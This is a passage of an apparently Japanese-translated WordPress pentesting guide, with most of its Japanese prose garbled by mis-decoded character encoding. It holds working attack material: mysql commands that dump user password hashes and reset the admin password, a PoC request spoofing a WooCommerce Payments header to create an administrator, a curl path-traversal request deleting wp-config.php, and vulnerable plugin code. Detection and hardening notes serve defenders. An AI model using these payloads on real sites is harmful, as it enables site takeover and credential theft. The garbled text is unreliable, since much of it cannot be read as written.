- Metasploit framework ã¯ã“ã®è„†å¼±æ€§ã«å¯¾ã™ã‚‹ exploit ã‚’æä¾›ã—ã¾ã™ã€‚é©åˆ‡ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€meterpreter ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ã‚µã‚¤ãƒˆã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- ã“ã‚Œã¯ WordPress ã‚µã‚¤ãƒˆã‚’æ‚ªç”¨ã™ã‚‹å¤šãã®æ–¹æ³•ã®ã†ã¡ã®ä¸€ã¤ã«éããªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

ã“ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã¯ã€plugin ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŠã‚ˆã³æœ‰åŠ¹åŒ–ã™ã‚‹æ‰‹é †ã‚’ç¤ºã™ WordPress dashboard ã®å›³ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãŸã ã—ã€æ­£å½“ãªè¨±å¯ãªã—ã«ã“ã®ã‚ˆã†ã«è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯é•æ³•ã§ã‚ã‚Šéå€«ç†çš„ã§ã™ã€‚ã“ã®æƒ…å ±ã¯è²¬ä»»ã‚’æŒã£ã¦ã€æ˜ç¢ºãªè¨±å¯ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã€ä¾‹ãˆã° penetration testing ã®ã‚ˆã†ãªåˆæ³•çš„ãªå ´é¢ã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ã¯ **Cross-Site Scripting (XSS)** ã®è„†å¼±æ€§ã‚’ **Remote Code Execution (RCE)** ã‚„ãã®ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã•ã›ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚è©³ç´°ã¯ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**Wordpress Versions 6.X.X, 5.X.X and 4.X.X.** ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€ä»¥ä¸‹ã‚’å¯èƒ½ã«ã—ã¾ã™:
- _**Privilege Escalation:**_ WordPress ã«ãƒ¦ãƒ¼ã‚¶ã‚’ä½œæˆã—ã¾ã™ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ã‚«ã‚¹ã‚¿ãƒ  plugin (backdoor) ã‚’ WordPress ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
- _**(RCE) Built-In Plugin Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ plugin ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(RCE) Built-In Theme Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ theme ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(Custom) Custom Exploits:**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã® WordPress Plugins/Themes ã«å¯¾ã™ã‚‹ã‚«ã‚¹ã‚¿ãƒ  exploit ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

## Post Exploitation

ãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ Pentest

### æ”»æ’ƒå¯¾è±¡

Wordpress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯ã€ãã®æ©Ÿèƒ½ã«ãŠã‘ã‚‹è„†å¼±æ€§ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã¯ä»¥ä¸‹ã®ç®‡æ¡æ›¸ãã§ç¢ºèªã§ãã€è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ä¾‹ã«ã¤ã„ã¦ã¯ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

- **`wp_ajax`**

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒé–¢æ•°ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã®1ã¤ã¯ã€AJAXãƒãƒ³ãƒ‰ãƒ©ã‚’ä»‹ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒ­ã‚¸ãƒƒã‚¯ã€èªå¯ã€ã‚ã‚‹ã„ã¯èªè¨¼ã®ãƒã‚°ã‚’å«ã‚“ã§ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®é–¢æ•°ã¯èªè¨¼ã¨èªå¯ã®ä¸¡æ–¹ã‚’ Wordpress ã® nonce ã®å­˜åœ¨ã«åŸºã¥ã‹ã›ã‚‹ã“ã¨ãŒã—ã°ã—ã°ã‚ã‚Šã€nonce ã¯ **Wordpress ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§èªè¨¼ã•ã‚ŒãŸä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŒã¡å¾—ã‚‹**ï¼ˆå½¹å‰²ã«é–¢ä¿‚ãªãï¼‰ã‚‚ã®ã§ã™ã€‚

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**The use of `nopriv` makes the endpoint accessible by any users (even unathenticated ones).**

> [!CAUTION]
> ã•ã‚‰ã«ã€ã‚‚ã—é–¢æ•°ãŒ `wp_verify_nonce` ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªå¯ã ã‘ã‚’ç¢ºèªã—ã¦ã„ã‚‹ã ã‘ãªã‚‰ã€ã“ã®é–¢æ•°ã¯å˜ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§ã€é€šå¸¸ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å½¹å‰²ã‚’ç¢ºèªã™ã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ä½æ¨©é™ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé«˜æ¨©é™ã®æ“ä½œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **REST API**

ã¾ãŸã€`register_rest_route` é–¢æ•°ã‚’ä½¿ã£ã¦ wordpress ã« REST API ã‚’ç™»éŒ²ã™ã‚‹ã“ã¨ã§ã€é–¢æ•°ã‚’å…¬é–‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **php ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹**

ã‚‚ã¡ã‚ã‚“ã€Wordpress ã¯ PHP ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚¦ã‚§ãƒ–ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è„†å¼±ãªæ©Ÿèƒ½ã‚’å…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ãã‚Œã¯ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨å¯èƒ½ã§ã™ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

Some plugins implement â€œtrusted headerâ€ shortcuts for internal integrations or reverse proxies and then use that header to set the current user context for REST requests. If the header is not cryptographically bound to the request by an upstream component, an attacker can spoof it and hit privileged REST routes as an administrator.

- Impact: èªè¨¼ãªã—ã§ã‚³ã‚¢ã® users REST ãƒ«ãƒ¼ãƒˆã‚’ä»‹ã—ã¦æ–°ã—ã„ç®¡ç†è€…ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ç®¡ç†è€…æ¨©é™ã«æ˜‡æ ¼ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ãƒ¦ãƒ¼ã‚¶ãƒ¼ID 1 ã‚’å¼·åˆ¶æŒ‡å®šã—ã€é€šå¸¸ã¯æœ€åˆã®ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚Šã¾ã™ã€‚)
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ã‚’èªè¨¼çŠ¶æ…‹ã«ãƒãƒƒãƒ—ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¦ã„ã‚‹ã€‚
- WordPress core ã¯ã“ã®ãƒ«ãƒ¼ãƒˆã« `create_users` capability ã‚’æœŸå¾…ã™ã‚‹ãŒã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒƒã‚¯ã¯ãƒ˜ãƒƒãƒ€ã‹ã‚‰ç›´æ¥ current user ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’å›é¿ã—ã¦ã„ã‚‹ã€‚

Expected success indicators

- ä½œæˆã—ãŸãƒ¦ãƒ¼ã‚¶ã‚’è¨˜è¿°ã™ã‚‹ JSON ãƒœãƒ‡ã‚£ã‚’å«ã‚€ HTTP 201ã€‚
- `wp-admin/users.php` ã«æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã€‚

Detection checklist

- ãƒ¦ãƒ¼ã‚¶ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ã‚’èª­ã¿å–ã‚‹ `getallheaders()`ã€`$_SERVER['HTTP_...']`ã€ã¾ãŸã¯ãƒ™ãƒ³ãƒ€ãƒ¼ SDKï¼ˆä¾‹: `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã‚’ grep ã™ã‚‹ã€‚
- å …ç‰¢ãª `permission_callback` ãƒã‚§ãƒƒã‚¯ãŒæ¬ å¦‚ã—ã¦ãŠã‚Šã€ä»£ã‚ã‚Šã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ã«ä¾å­˜ã—ã¦ã„ã‚‹ç‰¹æ¨©ä»˜ãã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã«ã¤ã„ã¦ REST ç™»éŒ²ã‚’ç¢ºèªã™ã‚‹ã€‚
- REST ãƒãƒ³ãƒ‰ãƒ©å†…ã§ãƒ˜ãƒƒãƒ€å€¤ã ã‘ã§ã‚²ãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ core user-management é–¢æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰ã®åˆ©ç”¨ã‚’æ¢ã™ã€‚

Hardening

- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ã‹ã‚‰èªè¨¼ã‚„èªå¯ã‚’æ´¾ç”Ÿã•ã›ã¦ã¯ãªã‚‰ãªã„ã€‚
- reverse proxy ãŒ identity ã‚’æ³¨å…¥ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€ãƒ—ãƒ­ã‚­ã‚·ã§ä¿¡é ¼ã‚’çµ‚ç«¯ã—ã‚¤ãƒ³ãƒã‚¦ãƒ³ãƒ‰ã®ã‚³ãƒ”ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹ï¼ˆä¾‹: ã‚¨ãƒƒã‚¸ã§ `unset X-Wcpay-Platform-Checkout-User`ï¼‰ã€ãã®å¾Œç½²åä»˜ããƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¸¡ã—ã¦ã‚µãƒ¼ãƒãƒ¼å´ã§æ¤œè¨¼ã™ã‚‹ã€‚
- ç‰¹æ¨©çš„æ“ä½œã‚’è¡Œã† REST ãƒ«ãƒ¼ãƒˆã§ã¯ `current_user_can()` ãƒã‚§ãƒƒã‚¯ã¨å³æ ¼ãª `permission_callback` ã‚’è¦æ±‚ã™ã‚‹ï¼ˆ`__return_true` ã‚’ä½¿ç”¨ã—ã¦ã¯ãªã‚‰ãªã„ï¼‰ã€‚
- ãƒ˜ãƒƒãƒ€ã«ã‚ˆã‚‹ â€œimpersonationâ€ ã‚ˆã‚Šã‚‚ã€ãƒ•ã‚¡ãƒ¼ã‚¹ãƒˆãƒ‘ãƒ¼ãƒ†ã‚£èªè¨¼ï¼ˆcookiesã€application passwordsã€OAuthï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ã®ãƒ†ãƒ¼ãƒã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã—ã°ã—ã° `wp_ajax_` ã¨ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ã‚’é€šã˜ã¦ AJAX ãƒãƒ³ãƒ‰ãƒ©ã‚’å…¬é–‹ã™ã‚‹ã€‚**_nopriv_** ãƒãƒªã‚¢ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã‚‹ã¨ **ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯æœªèªè¨¼ã®è¨ªå•è€…ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹**ãŸã‚ã€æ•æ„Ÿãªå‡¦ç†ã¯è¿½åŠ ã§æ¬¡ã‚’å®Ÿè£…ã—ãªã‘ã‚Œã°ãªã‚‰ãªã„:

1. **æ¨©é™ãƒã‚§ãƒƒã‚¯**ï¼ˆä¾‹: `current_user_can()`ã€å°‘ãªãã¨ã‚‚ `is_user_logged_in()`ï¼‰ã€ãŠã‚ˆã³
2. `check_ajax_referer()` / `wp_verify_nonce()` ã§æ¤œè¨¼ã•ã‚Œã‚‹ **CSRF nonce**ã€ãŠã‚ˆã³
3. **å³æ ¼ãªå…¥åŠ›ã‚µãƒ‹ã‚¿ã‚¤ã‚º / ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³**ã€‚

Litho multipurpose theme (< 3.1) ã¯ *Remove Font Family* æ©Ÿèƒ½ã§ã“ã‚Œã‚‰ 3 ã¤ã®åˆ¶å¾¡ã‚’å¿˜ã‚Œã¦ãŠã‚Šã€çµæœã¨ã—ã¦æ¬¡ã®ã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥åŒ–ï¼‰ã‚’å‡ºè·ã—ã¦ã„ãŸï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã«ã‚ˆã£ã¦å°å…¥ã•ã‚Œã‚‹å•é¡Œç‚¹:

* **Unauthenticated access** â€“ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ãŒç™»éŒ²ã•ã‚Œã¦ã„ã‚‹ã€‚
* **No nonce / capability check** â€“ è¨ªå•è€…ã¯èª°ã§ã‚‚ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã€‚
* **No path sanitisation** â€“ ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® `fontfamily` æ–‡å­—åˆ—ãŒãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãªã—ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ãƒ‘ã‚¹ã«é€£çµã•ã‚Œã€å¤å…¸çš„ãª `../../` ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’è¨±ã—ã¦ã„ã‚‹ã€‚

#### æ‚ªç”¨

æ”»æ’ƒè€…ã¯å˜ä¸€ã® HTTP POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§ã€é€šå¸¸ `<wp-root>/wp-content/uploads/` ã«ã‚ã‚‹ã€**uploads base directory ä»¥ä¸‹ã®** ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã§ãã‚‹:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
`wp-config.php` ã¯ *uploads* ã®å¤–ã«ã‚ã‚‹ãŸã‚ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ã¯ `../` ã‚’4å›ç¹°ã‚Šè¿”ã™ã ã‘ã§ååˆ†ã§ã™ã€‚`wp-config.php` ã‚’å‰Šé™¤ã™ã‚‹ã¨ã€æ¬¡å›ã®è¨ªå•æ™‚ã« WordPress ã¯ *ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚¦ã‚£ã‚¶ãƒ¼ãƒ‰* ã«å…¥ã‚Šã€ã‚µã‚¤ãƒˆã‚’å®Œå…¨ã«ä¹—ã£å–ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ï¼ˆæ”»æ’ƒè€…ã¯æ–°ã—ã„ DB è¨­å®šã‚’æ¸¡ã—ã€ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ã ã‘ã§ã™ï¼‰ã€‚

ä»–ã«å½±éŸ¿ã®å¤§ãã„ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨ã—ã¦ã¯ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ãƒ†ãƒ¼ãƒã® `.php` ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ãŸã‚ï¼‰ã‚„ `.htaccess` ã®ãƒ«ãƒ¼ãƒ«ãªã©ãŒã‚ã‚Šã¾ã™ã€‚

#### æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

* ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ˜ãƒ«ãƒ‘ãƒ¼ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ãªã©ï¼‰ã‚’å‘¼ã³å‡ºã™ `add_action( 'wp_ajax_nopriv_...')` ã®ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã€‚
* ãƒ‘ã‚¹ã«å¯¾ã—ã¦ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’é€£çµã—ã¦ã„ã‚‹ï¼ˆ`$_POST`, `$_GET`, `$_REQUEST` ã‚’æ¢ã™ï¼‰ã€‚
* `check_ajax_referer()` ã‚„ `current_user_can()`/`is_user_logged_in()` ã®ä¸åœ¨ã€‚

#### å¼·åŒ–
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **å¸¸ã«** ãƒ‡ã‚£ã‚¹ã‚¯ã¸ã®æ›¸ãè¾¼ã¿/å‰Šé™¤æ“ä½œã¯æ¨©é™ãŒå¿…è¦ãªæ“ä½œã¨ã—ã¦æ‰±ã„ã€å¿…ãšå†ç¢ºèªã—ã¦ãã ã•ã„:
> â€¢ èªè¨¼  â€¢ èªå¯  â€¢ Nonce  â€¢ å…¥åŠ›ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚º  â€¢ ãƒ‘ã‚¹ã®åŒ…å« (ä¾‹: `realpath()` ã¨ `str_starts_with()` ã‚’ä½µç”¨).

---

### Privilege escalation â€” å¤ã„ãƒ­ãƒ¼ãƒ«ã®å¾©å…ƒã¨èªå¯ä¸è¶³ã«ã‚ˆã‚‹ (ASE "View Admin as Role")

å¤šãã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ "view as role" ã‚„ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã€å…ƒã®ãƒ­ãƒ¼ãƒ«ã‚’ user meta ã«ä¿å­˜ã—ã¦å¾Œã§å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚å¾©å…ƒå‡¦ç†ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹: `$_REQUEST['reset-for']`ï¼‰ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®ãƒªã‚¹ãƒˆã®ã¿ã‚’é ¼ã‚Šã«ã—ã€capabilities ã®ç¢ºèªã‚„æœ‰åŠ¹ãª nonce ã‚’æ¤œè¨¼ã—ã¦ã„ãªã„å ´åˆã€ã“ã‚Œã¯ vertical privilege escalation ã«ãªã‚Šã¾ã™ã€‚

å®Ÿéš›ã®ä¾‹ã¨ã—ã¦ã€Admin and Site Enhancements (ASE) ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ (â‰¤ 7.6.2.1) ã§å•é¡ŒãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚reset ãƒ–ãƒ©ãƒ³ãƒã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå†…éƒ¨é…åˆ— `$options['viewing_admin_as_role_are']` ã«å­˜åœ¨ã™ã‚‹å ´åˆã« `reset-for=<username>` ã«åŸºã¥ã„ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¾©å…ƒã—ã¦ã„ã¾ã—ãŸãŒã€`current_user_can()` ãƒã‚§ãƒƒã‚¯ã‚‚ nonce ã®æ¤œè¨¼ã‚‚è¡Œã‚ãšã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ user meta `_asenha_view_admin_as_original_roles` ã‹ã‚‰ä¿å­˜ã•ã‚Œã¦ã„ãŸãƒ­ãƒ¼ãƒ«ã‚’å†è¿½åŠ ã—ã¦ã„ã¾ã—ãŸ:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- ã‚µãƒ¼ãƒãƒ¼å´ã®èªå¯ãªã—ã« `$_REQUEST['reset-for']` ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä¿¡é ¼ã™ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»¥å‰ `_asenha_view_admin_as_original_roles` ã«é«˜ã„æ¨©é™ã‚’ä¿å­˜ã•ã‚Œã¦ã„ã¦ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒªã‚»ãƒƒãƒˆãƒ‘ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãã‚Œã‚‰ã‚’å¾©å…ƒã§ãã‚‹ã€‚
- ä¸€éƒ¨ã®å°å…¥ç’°å¢ƒã§ã¯ã€èªè¨¼æ¸ˆã¿ã®ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ `viewing_admin_as_role_are` ã«ã¾ã æ®‹ã£ã¦ã„ã‚‹åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒªã‚»ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ï¼ˆèªå¯ã®ç ´ç¶»ï¼‰ã€‚

æ”»æ’ƒã®å‰ææ¡ä»¶

- å½“è©²æ©Ÿèƒ½ãŒæœ‰åŠ¹åŒ–ã•ã‚ŒãŸè„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã€‚
